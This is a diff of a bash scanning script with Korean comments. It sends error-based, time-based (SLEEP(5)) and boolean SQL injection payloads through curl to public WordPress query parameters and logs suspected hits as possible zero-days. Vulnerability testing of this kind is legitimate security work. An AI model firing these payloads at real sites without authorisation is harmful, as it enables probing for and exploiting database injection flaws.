@@ -1,6 +1,4 @@
 #!/bin/bash
-# 3_wfuzz.sh - wfuzz 파라미터 퍼징 및 빠른 SQLi 테스트
-
 set -e
 
 TARGET_BASE="${TARGET_BASE:-http://localhost:8888/wordpress-zeroday}"
@@ -10,103 +8,183 @@ OUTPUT_JSON="${RESULTS_DIR}/wfuzz_results.json"
 mkdir -p "${RESULTS_DIR}"
 
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "⚡ wfuzz - 파라미터 퍼징 & 빠른 SQLi"
+echo "⚡ wfuzz - 실전 SQLi 탐지 💪"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "Target: ${TARGET_BASE}"
 echo ""
 
-# 타겟 연결 확인
+# 연결 확인
 echo "🔗 타겟 서버 연결 확인 중..."
 if curl -s --max-time 5 "${TARGET_BASE}" > /dev/null 2>&1; then
     echo "✅ 서버 접근 가능"
 else
-    echo "❌ 서버 접근 불가! 타겟 URL 확인 필요"
-    echo '{
-  "scan_type": "parameter_fuzzing",
-  "tool": "wfuzz",
-  "target": "'${TARGET_BASE}'",
-  "timestamp": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'",
-  "results": [],
-  "error": "Target unreachable"
-}' > "${OUTPUT_JSON}"
+    echo "❌ 서버 접근 불가!"
+    echo '{"scan_type":"parameter_fuzzing","tool":"wfuzz","results":[],"error":"Target unreachable"}' > "${OUTPUT_JSON}"
     exit 0
 fi
 
 echo ""
+echo "🎯 실제 취약점 탐지 모드"
+echo "  - Error-based SQLi"
+echo "  - Time-based SQLi (5초)"
+echo "  - Boolean-based SQLi"
+echo ""
 
-# 테스트 대상 엔드포인트
-declare -A ENDPOINTS=(
-    ["wps_pages_page-id"]="/wp-admin/admin.php?page=wps_pages_page&id="
-    ["wps_overview-user_id"]="/wp-admin/admin.php?page=wps_overview&user_id="
-    ["wps_categories-category_id"]="/wp-admin/admin.php?page=wps_categories&category_id="
-    ["wps_pages-page_id"]="/wp-admin/admin.php?page=wps_pages&page_id="
+# 실전 엔드포인트 (공개 페이지 우선!)
+ENDPOINTS=(
+    "search-s:/?s="
+    "p-p:/?p="
+    "page_id-page_id:/?page_id="
+    "cat-cat:/?cat="
+    "author-author:/?author="
+    "m-m:/?m="
 )
 
 # JSON 시작
-echo '{
+cat > "${OUTPUT_JSON}" << JSONSTART
+{
   "scan_type": "parameter_fuzzing",
   "tool": "wfuzz",
-  "target": "'${TARGET_BASE}'",
-  "timestamp": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'",
-  "results": [' > "${OUTPUT_JSON}"
+  "target": "${TARGET_BASE}",
+  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
+  "results": [
+JSONSTART
 
 first=true
 vuln_count=0
 
-for name in "${!ENDPOINTS[@]}"; do
-    endpoint="${ENDPOINTS[$name]}"
+for entry in "${ENDPOINTS[@]}"; do
+    name="${entry%%:*}"
+    endpoint="${entry#*:}"
     param=$(echo "$name" | cut -d'-' -f2)
     
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     echo "Testing: ${name}"
-    echo "  Endpoint: ${endpoint}"
+    echo "  URL: ${TARGET_BASE}${endpoint}"
+    echo ""
     
-    # Time-based SQLi 테스트
-    echo "  Testing time-based SQLi..."
-    start=$(date +%s.%N 2>/dev/null || date +%s)
+    # 1. Error-based SQLi
+    echo "  [1/3] Error-based SQLi..."
+    error_response=$(curl -s --max-time 10 "${TARGET_BASE}${endpoint}1'" 2>&1 || true)
     
-    curl -s --max-time 10 \
-        "${TARGET_BASE}${endpoint}1' AND SLEEP(5)--" > /dev/null 2>&1 || true
-    
-    end=$(date +%s.%N 2>/dev/null || date +%s)
-    duration=$(echo "$end - $start" | bc 2>/dev/null || echo "0")
-    duration_int=$(printf "%.0f" "$duration" 2>/dev/null || echo "0")
-    
-    echo "  Response time: ${duration}s (threshold: 5s)"
-    
-    # 5초 이상이면 취약
-    if [ "$duration_int" -ge 5 ]; then
+    if echo "$error_response" | grep -iq "SQL\|mysql\|syntax\|database\|query"; then
+        echo "  🚨 SQL 에러 발견!"
         vuln_count=$((vuln_count + 1))
         
-        if [ "$first" = false ]; then
-            echo "," >> "${OUTPUT_JSON}"
-        fi
+        [ "$first" = false ] && echo "," >> "${OUTPUT_JSON}"
         first=false
         
-        echo "  🚨 Time-based SQLi 발견!"
-        
-        cat >> "${OUTPUT_JSON}" << JSONEOF
+        cat >> "${OUTPUT_JSON}" << VULNEOF
     {
       "endpoint": "${name}",
       "url": "${TARGET_BASE}${endpoint}",
       "parameter": "${param}",
-      "payload": "1' AND SLEEP(5)--",
-      "response_time": "${duration}s",
-      "vulnerability": "time-based-sqli",
+      "payload": "1'",
+      "vulnerability": "error-based-sqli",
       "severity": "HIGH",
+      "evidence": "SQL error in response",
       "potential_zero_day": true
     }
-JSONEOF
-    else
-        echo "  ✅ 안전 (${duration}s < 5s)"
+VULNEOF
+        echo "  ✅ Error-based SQLi 확인!"
+        echo ""
+        continue
     fi
+    echo "  ✅ Error-based: 안전"
+    
+    # 2. Time-based SQLi (5초!)
+    echo "  [2/3] Time-based SQLi (5s)..."
+    start=$(date +%s)
+    curl -s --max-time 15 \
+        "${TARGET_BASE}${endpoint}1' AND SLEEP(5)-- -" > /dev/null 2>&1 || true
+    end=$(date +%s)
+    duration=$((end - start))
+    
+    echo "  Response time: ${duration}s (threshold: 5s)"
+    
+    if [ "$duration" -ge 5 ] && [ "$duration" -le 10 ]; then
+        echo "  🚨 Time-based SQLi 발견!"
+        vuln_count=$((vuln_count + 1))
+        
+        [ "$first" = false ] && echo "," >> "${OUTPUT_JSON}"
+        first=false
+        
+        cat >> "${OUTPUT_JSON}" << VULNEOF
+    {
+      "endpoint": "${name}",
+      "url": "${TARGET_BASE}${endpoint}",
+      "parameter": "${param}",
+      "payload": "1' AND SLEEP(5)-- -",
+      "response_time": "${duration}s",
+      "vulnerability": "time-based-sqli",
+      "severity": "CRITICAL",
+      "potential_zero_day": true
+    }
+VULNEOF
+        echo "  ✅ Time-based SQLi 확인!"
+        echo ""
+        continue
+    fi
+    echo "  ✅ Time-based: 안전 (${duration}s)"
+    
+    # 3. Boolean-based SQLi
+    echo "  [3/3] Boolean-based SQLi..."
+    
+    # TRUE 조건
+    true_response=$(curl -s --max-time 10 "${TARGET_BASE}${endpoint}1' AND '1'='1" 2>&1 || true)
+    true_length=${#true_response}
+    
+    # FALSE 조건
+    false_response=$(curl -s --max-time 10 "${TARGET_BASE}${endpoint}1' AND '1'='2" 2>&1 || true)
+    false_length=${#false_response}
+    
+    # 응답 차이 확인 (10% 이상 차이)
+    diff=$((true_length - false_length))
+    if [ "$diff" -lt 0 ]; then
+        diff=$((-diff))
+    fi
+    
+    threshold=$((true_length / 10))
+    
+    if [ "$diff" -gt "$threshold" ] && [ "$threshold" -gt 10 ]; then
+        echo "  🚨 Boolean-based SQLi 발견!"
+        echo "    TRUE response: ${true_length} bytes"
+        echo "    FALSE response: ${false_length} bytes"
+        echo "    Difference: ${diff} bytes"
+        
+        vuln_count=$((vuln_count + 1))
+        
+        [ "$first" = false ] && echo "," >> "${OUTPUT_JSON}"
+        first=false
+        
+        cat >> "${OUTPUT_JSON}" << VULNEOF
+    {
+      "endpoint": "${name}",
+      "url": "${TARGET_BASE}${endpoint}",
+      "parameter": "${param}",
+      "payload": "1' AND '1'='1 vs 1' AND '1'='2",
+      "vulnerability": "boolean-based-sqli",
+      "severity": "HIGH",
+      "evidence": "Response difference: ${diff} bytes",
+      "potential_zero_day": true
+    }
+VULNEOF
+        echo "  ✅ Boolean-based SQLi 확인!"
+    else
+        echo "  ✅ Boolean-based: 안전"
+    fi
+    
     echo ""
 done
 
 # JSON 종료
-echo '
+cat >> "${OUTPUT_JSON}" << JSONEND
   ]
-}' >> "${OUTPUT_JSON}"
+}
+JSONEND
 
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "✅ wfuzz 스캔 완료"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "결과: ${OUTPUT_JSON}"
 echo "발견된 취약점: ${vuln_count}개"
